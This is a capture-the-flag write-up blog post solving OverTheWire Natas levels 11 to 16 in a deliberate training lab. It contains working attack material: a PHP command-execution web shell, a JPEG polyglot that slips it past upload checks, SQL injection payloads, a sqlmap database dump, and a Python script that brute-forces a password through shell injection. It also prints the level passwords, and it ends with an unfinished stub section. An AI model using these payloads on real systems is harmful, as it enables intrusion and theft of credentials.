---
title: "Linux training with overthewire [Part 5/10: Natas 11-]"
author: Florian Courgey
layout: post
categories:
  - opensource
  - linux
  - bash
  - shell
  - hack
  - server
---
Excerpt here...
<!--more-->

This post is part of a series:
- [Linux training with overthewire Part 1: Bandit 1-10]({% post_url 2018-11-30-linux-training-overthewire-bandit-1 %})
- [Linux training with overthewire Part 2: Bandit 11-20]({% post_url 2018-11-30-linux-training-overthewire-bandit-2 %})
- [Linux training with overthewire Part 3: Bandit 21-30]({% post_url 2018-11-30-linux-training-overthewire-bandit-3 %})
- [Linux training with overthewire Part 4: Natas]({% post_url 2018-11-30-linux-training-overthewire-natas-1 %})
- Linux training with overthewire Part 5: Natas 11-
- [Linux training with overthewire Part 5: Leviathan]({% post_url 2018-11-30-linux-training-overthewire-leviathan %})

### Level 11 - XOR encryption
```
http://natas11.natas.labs.overthewire.org/ natas11 U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```
Check your Cookies and find `Set-Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=`.

This is an base64-encoded JSON object from the PHP array
```php
[
  "showpassword"=>"no",
  "bgcolor"=>"#ffffff"
]
```

As we have the base value and the final value, the XOR can be reversed to find the key. Copy/paste the `xor_encrypt` function and replace `$key` by the base64-decoded value of the cookie:
```bash
$ vim natas11.php
```
```php
function xor_encrypt($in) {
  $key = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
  $text = $in;
  $outText = '';
  // Iterate through each character
  for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
  }
  return $outText;
}
$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
echo xor_encrypt(json_encode($defaultdata));
```
```bash
$ php -f natas11.php
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```

Here's the key: `qw8J`! We can now replace it in the default algorithm, and change `"showpassword"=>"yes"`:
```php
function xor_encrypt($in) {
  $key = 'qw8J';
  $text = $in;
  $outText = '';
  // Iterate through each character
  for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
  }
  return $outText;
}
$defaultdata = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
echo xor_encrypt(json_encode($defaultdata));
```
```bash
$ php -f xor.php
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```
Update your `data` cookie value and refresh the page to get the password:
`EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`

### Level 12 - File upload without security
```
http://natas12.natas.labs.overthewire.org/ natas12 EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```
Alright, what do we have?
- a POST form from index.php to index.php
- 2 hidden text fields:
  - `MAX_FILE_SIZE` defaulted to `1000`
  - `filename` with a generated 10-char string from `genRandomString()` then `.jpg`
- A `file` field named `uploadedfile`

After looking at the source code, there is no security on the file type, as it is guessed from the client-side field `filename` with `pathinfo`:
```php
$ext = pathinfo($_POST["filename"], PATHINFO_EXTENSION);
```

So basically we can upload any file (such as a PHP file) and display/run it on the server. Let's check if we are right. Create a simple file `love.php`:
```
<?php echo "love"; ?>
```
Display the form, replace the extension of `filename` to `.php` and upload our PHP file:


<div class="text-center">
  <video autoplay loop muted playsinline height="250">
    <source src="/assets/images/2018/12/overthewire-natas12-php-injection.mp4" type="video/mp4" />
  </video>
</div>

💦💦💦💦💦

Let's hack! Inject a classic backdoor:
```html
<pre><?php system($_GET['backdoor']); ?></pre>
```
[http://natas12.natas.labs.overthewire.org/upload/pqpeihbpm7.php?backdoor=cat%20/etc/natas_webpass/natas13](http://natas12.natas.labs.overthewire.org/upload/pqpeihbpm7.php?backdoor=cat%20/etc/natas_webpass/natas13) gives `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`.


We can also display other people's solutions: [http://natas12.natas.labs.overthewire.org/upload/pqpeihbpm7.php?backdoor=ls -alh](http://natas12.natas.labs.overthewire.org/upload/pqpeihbpm7.php?backdoor=ls -alh)

![](/assets/images/2018/12/overthewire-natas12-php-injection-list-solutions.jpg)

### Level 13 - File upload with `exif_imagetype()` security
```
http://natas13.natas.labs.overthewire.org/ natas13 jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

The security has been ~~slightly~~ enhanced:
- Check on `$_FILES[...]["error"]` (l. 46)
- The `MAX_FILE_SIZE` field is no longer used. The maximum file size is hardcoded as `1000` on server-side (l. 52)
- Check the file type with `exif_imagetype()` (l. 54) <-- this is the interesting part

Create a JPG image with just a pixel:
- Size 1x1
- 1 DPI
- JPG Quality 1

> You can download one here [overthewire-natas13-pixel.jpg](/assets/images/2018/12/overthewire-natas13-pixel.jpg)

Open it in any decent image editor, and add the payload as "comment". Example with GIMP `Image > Image properties`:
![](/assets/images/2018/12/overthewire-natas13-pixel-edited-with-gimp.jpg)

Gives the following [http://natas13.natas.labs.overthewire.org/upload/pdy3zp0pdc.php](http://natas13.natas.labs.overthewire.org/upload/pdy3zp0pdc.php)
![](/assets/images/2018/12/overthewire-natas13-pixel-edited-with-love.jpg)
> You can download it here [overthewire-natas13-pixel-with-love.jpg](/assets/images/2018/12/overthewire-natas13-pixel-with-love.jpg)


💦💦💦💦💦

> Open the file in any hex editor, comments are added after the `FF FE` bytes:
![](/assets/images/2018/12/overthewire-natas13-pixel-edited-with-love-in-hex-editor.jpg)
See [https://en.wikipedia.org/wiki/JPEG#Syntax_and_structure](https://en.wikipedia.org/wiki/JPEG#Syntax_and_structure)

Inject the same backdoor as in the previous challenge [http://natas13.natas.labs.overthewire.org/upload/rh8gw09927.php?backdoor=cat%20/etc/natas_webpass/natas14](http://natas13.natas.labs.overthewire.org/upload/rh8gw09927.php?backdoor=cat%20/etc/natas_webpass/natas14)

`Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`

![](/assets/images/2018/12/overthewire-natas13-solution.jpg)

> You can download the final payload here [overthewire-natas13-pixel-with-backdoor.jpg](/assets/images/2018/12/overthewire-natas13-pixel-with-backdoor.jpg)

> Also, we can completely forge the payload without any software. The idea is to add the JPG magic numbers `ff d8 ff` in hexadecimal format
```bash
$ echo -n -e "\xff\xd8\xff<?php system(\$_GET['backdoor']); ?>" > payload.jpg
$ file payload.jpg
payload.jpg: JPEG image data
```
It takes 38 octets and works just as fine!!
It also proves that `file` and `exif_imagetype` are based on magic numbers, which may be completely misleading!!

### Level 14 - SQL injection
```
http://natas1.natas.labs.overthewire.org/ natas Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```
In the PHP code we have
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=...";
```

If we inject `" or 1=1 #` in the username field, we send this final SQL code:

```sql
SELECT * from users where username="" or 1=1 # and password=...
-- Equivalent to
SELECT * from users
```

`Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

### Level 15 -
```
http://natas15.natas.labs.overthewire.org/ natas15 AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

```bash
$ ./sqlmap.py --auth-cred="natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" --auth-type=BASIC -u 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16' --level 3 --dbms=mysql -p username --dbs
available databases [2]:
[*] information_schema
[*] natas15
$ ./sqlmap.py --auth-cred="natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" --auth-type=BASIC -u 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16' --level 3 --dbms=mysql -p username -D natas15 -T users --dump
Database: natas15
Table: users
[4 entries]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| bob      | 6P151OntQe                       |
| charlie  | HLwuGKts2w                       |
| alice    | hROtsfM734                       |
| natas16  | WaIHEacj63wnNIBROHeqi3p9t0m5nhmh |
+----------+----------------------------------+
```
`WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`
References:
- DVWA blind SQLi https://github.com/ethicalhack3r/DVWA
- https://www.youtube.com/watch?v=7PrUX2587A0
- https://www.owasp.org/index.php/Blind_SQL_Injection
- http://sqlmap.org/
- https://github.com/sqlmapproject/sqlmap/wiki/Usage

### Level 16 - Shell injection without ;|&\`\\'"
```
http://natas16.natas.labs.overthewire.org/ natas16 WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

We still have `$()`! The payload `$(grep -e ^a /etc/natas_webpass/natas17)love` will display `beloved,love..` if the password doesn't start with an `a`.

Bad boy:
```bash
$(grep -e ^a /etc/natas_webpass/natas17)love
# will result in "grep -i love dictionnary" so the output is
# beloved, love
```

Good boy:
```bash
$(grep -e ^8 /etc/natas_webpass/natas17)love
# will result in "grep -i 8love dictionnary" so the output is
# -- nothing --
```

Let's bruteforce this 💪💪💪 with python 3 🐍3️⃣

```python
#! /usr/bin/env python3
import requests

pwd = ''
baseUrl = 'http://natas16.natas.labs.overthewire.org/?needle=$(grep -e ^% /etc/natas_webpass/natas17)love'
alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
for i in range(0, 50):
    print('Current pwd "'+pwd+'" Bruteforcing', end='')
    for l in alphabet:
        print('.', end='', flush=True)
        url = baseUrl.replace('%', pwd+l)
        r = requests.get(url, auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
        if 'love' not in r.text:
            pwd += l
            print('letter found:', l)
            break;
```

```
Current pwd "" Bruteforcing.............................................................letter found: 8
Current pwd "8" Bruteforcing..........................................letter found: P
Current pwd "8P". Bruteforcing...................letter found: s
Current pwd "8Ps" Bruteforcing........................................................letter found: 3
Current pwd "8Ps3" Bruteforcing..................................letter found: H
Current pwd "8Ps3H" Bruteforcing.....................................................letter found: 0
[...]
Current pwd "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
```
`8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`

### Level  -
```
http://natas1.natas.labs.overthewire.org/ natas gtVrDuiDfck831PqWsLEZy5gyDz1clto
```
``


This post is part of a series:
- [Linux training with overthewire Part 1: Bandit 1-10]({% post_url 2018-11-30-linux-training-overthewire-bandit-1 %})
- [Linux training with overthewire Part 2: Bandit 11-20]({% post_url 2018-11-30-linux-training-overthewire-bandit-2 %})
- [Linux training with overthewire Part 3: Bandit 21-30]({% post_url 2018-11-30-linux-training-overthewire-bandit-3 %})
- [Linux training with overthewire Part 4: Natas]({% post_url 2018-11-30-linux-training-overthewire-natas-1 %})
- Linux training with overthewire Part 5: Natas 11-
- [Linux training with overthewire Part 5: Leviathan]({% post_url 2018-11-30-linux-training-overthewire-leviathan %})
